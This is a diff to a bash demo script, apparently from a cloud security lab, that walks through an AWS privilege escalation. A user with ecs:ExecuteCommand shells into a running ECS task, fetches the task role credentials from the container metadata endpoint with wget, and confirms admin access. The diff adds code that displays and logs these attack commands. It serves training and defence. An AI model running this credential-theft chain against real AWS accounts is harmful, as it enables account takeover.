@@ -4,7 +4,9 @@
 # This scenario demonstrates how a user with ecs:ExecuteCommand can shell into
 # a running ECS task with an admin role and retrieve credentials from the task metadata
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -12,6 +14,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-ecs-006-to-admin-starting-user"
@@ -101,6 +121,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -112,6 +133,7 @@ echo -e "${GREEN}Completed: Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}Completed: Retrieved account ID${NC}\n"
@@ -119,6 +141,7 @@ echo -e "${GREEN}Completed: Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}WARNING: Unexpectedly have admin permissions already${NC}"
 else
@@ -150,6 +173,7 @@ echo -e "${GREEN}Completed: Discovered running ECS task${NC}\n"
 
 # Step 6: Get task details
 echo -e "${YELLOW}Step 6: Getting task details${NC}"
+show_attack_cmd "aws ecs describe-tasks --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --tasks $TASK_ARN --output json"
 TASK_INFO=$(aws ecs describe-tasks \
     --region $AWS_REGION \
     --cluster $ECS_CLUSTER_NAME \
@@ -230,6 +254,7 @@ echo ""
 # The AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var only exists inside the container
 # Use a temp file to capture output (works better with interactive SSM sessions)
 TEMP_OUTPUT_FILE=$(mktemp)
+show_attack_cmd "aws ecs execute-command --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --task $TASK_ARN --container $CONTAINER_NAME --interactive --command 'sh -c \"wget -qO- 169.254.170.2\\\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"'"
 aws ecs execute-command \
     --region $AWS_REGION \
     --cluster $ECS_CLUSTER_NAME \
@@ -321,6 +346,7 @@ if [ -n "$STOLEN_ACCESS_KEY" ] && [ -n "$STOLEN_SECRET_KEY" ] && [ -n "$STOLEN_S
 
     # Verify identity
     echo "Verifying new identity..."
+    show_cmd "aws sts get-caller-identity --output json"
     NEW_IDENTITY=$(aws sts get-caller-identity --output json)
     echo "$NEW_IDENTITY" | jq .
 
@@ -334,6 +360,7 @@ if [ -n "$STOLEN_ACCESS_KEY" ] && [ -n "$STOLEN_SECRET_KEY" ] && [ -n "$STOLEN_S
     echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
     echo "Attempting to list IAM users..."
 
+    show_cmd "aws iam list-users --max-items 3 --output table --no-cli-pager"
     if aws iam list-users --max-items 3 --output table --no-cli-pager; then
         echo -e "${GREEN}Completed: Successfully listed IAM users!${NC}"
         echo -e "${GREEN}ADMIN ACCESS CONFIRMED${NC}"
@@ -361,6 +388,13 @@ if [ -n "$STOLEN_ACCESS_KEY" ] && [ -n "$STOLEN_SECRET_KEY" ] && [ -n "$STOLEN_S
     echo "  -> (curl metadata) -> Task Role Credentials"
     echo "  -> $TARGET_ROLE -> Admin Access"
 
+    if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+        echo -e "\n${YELLOW}Attack Commands:${NC}"
+        for cmd in "${ATTACK_COMMANDS[@]}"; do
+            echo -e "  ${CYAN}\$ ${cmd}${NC}"
+        done
+    fi
+
     echo -e "\n${YELLOW}Key Insight:${NC}"
     echo "The ecs:ExecuteCommand permission allows shelling into any running ECS task."
     echo "If a task has a privileged IAM role, the attacker can retrieve those credentials"
@@ -387,3 +421,6 @@ echo "  - T1059: Command and Scripting Interpreter"
 echo "  - TA0004: Privilege Escalation"
 echo "  - TA0006: Credential Access"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
